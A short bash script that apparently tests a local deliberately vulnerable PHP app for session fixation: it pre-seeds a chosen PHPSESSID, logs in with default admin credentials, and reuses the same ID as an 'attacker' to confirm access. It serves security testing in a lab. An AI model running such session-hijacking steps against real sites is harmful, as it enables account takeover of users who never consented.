#!/bin/bash
TARGET="http://127.0.0.1:8080"

echo "=== Proper Session Fixation Test ==="
echo ""

# Approach: Use curl cookie jar but set initial PHPSESSID
# The Netscape cookie format lets us pre-seed

echo "1. Create cookie jar with known PHPSESSID"
cat > /tmp/fix_jar.txt << 'COOKIE'
# Netscape HTTP Cookie File
127.0.0.1:8080	FALSE	/	FALSE	0	PHPSESSID	fix_session_test_101
127.0.0.1:8080	FALSE	/	FALSE	0	security	low
COOKIE
cat /tmp/fix_jar.txt
echo ""

echo "2. Get login page with this fixed session"
resp=$(curl -s -b /tmp/fix_jar.txt -c /tmp/fix_jar2.txt "$TARGET/login.php")
echo "Cookies after GET:"
cat /tmp/fix_jar2.txt
echo ""

# Check if our session ID was preserved
sessid=$(grep PHPSESSID /tmp/fix_jar2.txt | head -1 | awk '{print $NF}')
echo "PHPSESSID after GET: $sessid"
if [ "$sessid" = "fix_session_test_101" ]; then
    echo "[!] Server accepted our fixed session ID (no replacement)!"
else
    echo "[-] Server replaced our session ID with: $sessid"
fi
echo ""

echo "3. Now login with this session"
token=$(echo "$resp" | grep -oP "value='\K[a-f0-9]+" | head -1)
echo "Token: $token"
login_resp=$(curl -s -L -b /tmp/fix_jar2.txt -c /tmp/fix_jar3.txt \
    -d "username=admin&password=password&user_token=${token}&Login=Login" \
    "$TARGET/login.php")
echo "Cookies after login:"
cat /tmp/fix_jar3.txt
echo ""

sessid2=$(grep PHPSESSID /tmp/fix_jar3.txt | head -1 | awk '{print $NF}')
echo "PHPSESSID after login: $sessid2"
if [ "$sessid2" = "fix_session_test_101" ]; then
    echo "[!] VULNERABLE: Session ID unchanged after login!"
    echo "[!] SESSION FIXATION CONFIRMED"
elif [ "$sessid2" != "fix_session_test_101" ] && [ -n "$sessid2" ]; then
    echo "[-] Session ID changed on login (mitigates fixation)"
fi

# Check if logged in
if echo "$login_resp" | grep -q "Welcome"; then
    echo "[+] Login successful"
    echo ""
    echo "4. Attacker now uses the same session ID to access the app..."
    attacker=$(curl -s -H "Cookie: PHPSESSID=fix_session_test_101; security=low" \
        "$TARGET/index.php")
    if echo "$attacker" | grep -q "Welcome\|logout\|Menu"; then
        echo "[!] ATTACKER CAN ACCESS WITH fix_session_test_101!"
        echo "[!] SESSION FIXATION FULLY CONFIRMED"
    else
        echo "[-] Attacker access denied"
        echo "$attacker" | grep -i "<title>"
    fi
fi

